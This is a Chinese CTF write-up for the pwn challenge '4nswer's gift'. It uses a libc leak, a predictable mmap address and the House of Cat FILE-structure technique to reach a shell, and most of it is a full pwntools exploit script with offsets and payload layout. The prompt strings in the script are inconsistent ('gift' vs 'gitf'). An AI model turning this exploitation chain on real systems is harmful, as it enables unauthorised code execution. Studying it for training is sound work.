# 4nswer's gift

## 题目简述

程序启动时泄露 `_IO_list_all` 的运行时地址，随后允许指定一次超大 `malloc` 的大小并向所得区域写入数据。题目使用的高版本 glibc 会校验标准 FILE vtable，不能直接把虚表指向任意地址；目标是预测超大块的 mmap 地址，在其中伪造宽字符 FILE 结构，并用 House of Cat 在退出刷新流时调用 `system("/bin/sh")`。

## 解题过程

### 计算 libc 与伪造区地址

程序给出的地址就是 `_IO_list_all`，所以：

```python
libc.address = leaked_io_list_all - libc.sym["_IO_list_all"]
```

当申请尺寸远大于 top chunk 时，glibc 通过 `mmap` 分配匿名区。结合本题给定 libc 在本地调试其映射布局，可用：

```python
fake_file = libc.address - request_size - 0x4000 + 0x10
```

预测用户数据起点。这个偏移依赖题目提供的 libc 和实际映射布局，复现时应在同版本环境中核对 `/proc/$PID/maps`，不能把它当成跨版本通用常量。

### 构造 House of Cat

高版本 glibc 的 `_IO_vtable_check` 要求 FILE 的主 vtable 位于合法的 `__libc_IO_vtables` 区间，因此使用真实的 `_IO_wfile_jumps + 0x30`。触发链的关键关系是：

- 伪 FILE 的 `_wide_data` 指向可控区域；
- 宽字符数据中的 `_wide_vtable` 指向另一块可控区域；
- 合法主 vtable 走到宽字符处理路径；
- 伪宽字符虚表的目标槽放置 `system`；
- 伪 FILE 开头放置 `/bin/sh\0`，最终调用时它同时作为第一个参数。

下面保留官方题解的布局与偏移，并把失效的比赛地址改成可显式传入的参数：

```python
from pwn import *

context.binary = elf = ELF("./vuln", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

if args.REMOTE:
    host = args.HOST or "challenge.example"
    port = int(args.PORT or 31337)
    io = remote(host, port)
else:
    io = process(elf.path)

io.recvuntil(b"0x")
leak = int(io.recv(12), 16)
libc.address = leak - libc.sym["_IO_list_all"]
log.success(f"libc = {libc.address:#x}")

io_wfile_jumps = libc.sym["_IO_wfile_jumps"]
system = libc.sym["system"]

request_size = 0x20000000
io.sendlineafter(b"into the gift?", str(request_size).encode())

fake_file = libc.address - request_size - 0x4000 + 0x10
wide_data = fake_file + 0x200
wide_vtable = fake_file + 0x400
log.info(f"fake FILE = {fake_file:#x}")

payload = b"/bin/sh\x00"
payload += p64(0) * 4
payload += p64(1)              # _IO_write_ptr > _IO_write_base
payload += p64(0) * 14
payload += p64(wide_data)      # _wide_data
payload += p64(0) * 6
payload += p64(io_wfile_jumps + 0x30)

payload = payload.ljust(0x200, b"\x00")
payload += p64(0) * 4
payload += p64(1)
payload += p64(0) * 23
payload += p64(wide_vtable)    # _wide_vtable

payload = payload.ljust(0x400, b"\x00")
payload += p64(0) * 3
payload += p64(system)

io.sendafter(b"into the gitf?", payload)
io.interactive()
```

发送完成后程序进入 `exit` 路径，刷新 `_IO_list_all` 链上的伪流并落到 `system`。获得 shell 后执行：

```sh
cat /flag
```

即可读取实例 flag。官方与已收集的参赛者题解都没有保存这道动态 Pwn 实例的具体 flag，因此不虚构固定结果；漏洞原语、伪造布局和完整利用链均已保留。

## 方法总结

本题把三个条件组合在一起：libc 地址泄漏、可预测的超大 mmap 布局，以及一次完全可控写。高版本 glibc 下不能再随意伪造主 vtable，应使用 `_IO_wfile_jumps` 等合法表进入宽字符路径，再控制 `_wide_data` 与 `_wide_vtable`。所有地址偏移都必须以题目附带 libc 和实际调试结果为准。
